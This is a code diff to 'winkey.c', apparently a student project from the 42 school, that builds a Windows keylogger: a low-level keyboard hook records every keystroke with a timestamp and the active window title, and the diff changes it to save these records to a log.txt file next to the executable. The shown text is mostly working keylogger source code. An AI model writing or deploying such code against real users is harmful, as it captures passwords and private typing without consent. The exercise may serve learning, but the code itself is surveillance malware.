@@ -1,3 +1,15 @@
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   winkey.c                                           :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: emaugale <emaugale@student.42.fr>          +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2023/03/29 22:40:28 by emaugale          #+#    #+#             */
+/*   Updated: 2023/03/29 22:52:46 by emaugale         ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
+
 #define WIN32_LEAN_AND_MEAN
 #define _CRT_SECURE_NO_WARNINGS
 #define WINDOW_CLASS_NAME L"Winkey Window Class"
@@ -14,6 +26,9 @@ HHOOK keyboard_hook = NULL;
 HWND hwnd = NULL;  // The handle to the window created to received keyboard messages.
 
 char const *key_saved = NULL;
+
+FILE *file;
+char output[1024];
 
 static inline int to_utf8(wchar_t const *utf16, size_t utf16_len, char *utf8, size_t utf8_len)
 {
@@ -72,11 +87,17 @@ static void log_key(char const *key, char const *c)
         }
     }
 
-    printf(
+    sprintf(
+        output,
         "[%02d:%02d:%02d.%03d] <%s> => %s %s\n",
         system_time.wHour, system_time.wMinute,
         system_time.wSecond, system_time.wMilliseconds,
         window_title_utf8, key, c);
+
+    if (output) {
+        fwrite(output, 1, strlen(output), file);
+        fflush(file);
+    }
 }
 
 static void received_character(wchar_t *utf16, size_t utf16_len)
@@ -401,6 +422,13 @@ int CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam)
 
 int main(void)
 {
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    char *last_slash = strrchr(path, '\\');
+    if (last_slash)
+        *last_slash = '\0';
+
+    file = fopen(strcat(path, "\\log.txt"), "w");
     // Get the HINSTANCE of the running process.
     HINSTANCE hinstance = GetModuleHandleW(NULL);
 
